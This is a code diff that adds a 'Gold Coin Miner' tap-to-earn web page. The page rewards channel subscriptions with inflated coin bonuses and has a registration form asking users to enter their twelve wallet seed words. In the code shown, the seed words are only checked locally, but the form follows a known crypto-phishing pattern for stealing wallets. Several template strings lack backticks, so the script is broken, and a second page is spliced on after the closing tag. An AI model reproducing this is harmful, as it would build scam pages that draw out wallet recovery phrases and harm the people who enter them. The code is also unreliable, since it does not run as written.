@@ -3,6 +3,106 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gold Coin Miner</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; }
+        #main { margin-top: 50px; }
+        #coinDisplay { font-size: 24px; margin-bottom: 20px; }
+        .button { padding: 10px 20px; margin: 10px; background-color: #f0c040; border: none; cursor: pointer; }
+        .button:hover { background-color: #e0b030; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <div id="main">
+        <h1>Gold Coin Miner</h1>
+        <div id="coinDisplay">Coins: 0</div>
+        <button class="button" id="tapButton" onclick="mineCoin()">Tap to Mine</button>
+        <br>
+        <button class="button" id="subscribeButton" onclick="subscribeYoutube()">Subscribe to YouTube Channel</button>
+        <br>
+        <button class="button" id="joinTelegramButton" onclick="joinTelegram()">Join Telegram Channel</button>
+        <br>
+        <button class="button" id="registerButton" onclick="showRegistration()">Register</button>
+    </div>
+    <div id="registration" class="hidden">
+        <h2>Register</h2>
+        <input type="email" id="email" placeholder="Email Address">
+        <br>
+        <input type="text" id="wallet" placeholder="Enter 12 Seed Words">
+        <br>
+        <button class="button" onclick="registerUser()">Register</button>
+    </div>
+
+    <script>
+        let coins = 0;
+        let taps = 0;
+        const maxTapsPerHour = 100;
+        let userId = '';
+
+        function mineCoin() {
+            if (taps < maxTapsPerHour) {
+                coins++;
+                taps++;
+                document.getElementById('coinDisplay').innerText = Coins: ${coins};
+            } else {
+                alert('You have reached the maximum taps per hour.');
+            }
+        }
+
+        function subscribeYoutube() {
+            window.open('https://www.youtube.com/your-channel-url', '_blank');
+            coins += 110000;
+            document.getElementById('coinDisplay').innerText = Coins: ${coins};
+        }
+
+        function joinTelegram() {
+            window.open('https://t.me/your-channel-url', '_blank');
+            coins += 10000;
+            document.getElementById('coinDisplay').innerText = Coins: ${coins};
+        }
+
+        function showRegistration() {
+            document.getElementById('main').classList.add('hidden');
+            document.getElementById('registration').classList.remove('hidden');
+        }
+
+        function registerUser() {
+            const email = document.getElementById('email').value;
+            const seedWords = document.getElementById('wallet').value;
+
+            if (seedWords.split(' ').length === 12) {
+                userId = generateUserId();
+                coins += 5000;
+                alert(Registered! Your User ID is ${userId});
+                document.getElementById('coinDisplay').innerText = Coins: ${coins};
+                document.getElementById('registration').classList.add('hidden');
+                document.getElementById('main').classList.remove('hidden');
+            } else {
+                alert('Please enter a valid 12 seed words.');
+            }
+        }
+
+        function generateUserId() {
+            const chars = 'abcdefghijklmnopqrstuvwxyz123456789';
+            let id = '0x';
+            for (let i = 0; i < 40; i++) {
+                id += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return id;
+        }
+
+        setInterval(() => {
+            taps = 0;
+        }, 3600000); // Reset taps every hour
+    </script>
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Mining Page</title>
     <link rel="stylesheet" href="1.css"> <!-- Link to CSS file -->
 </head>
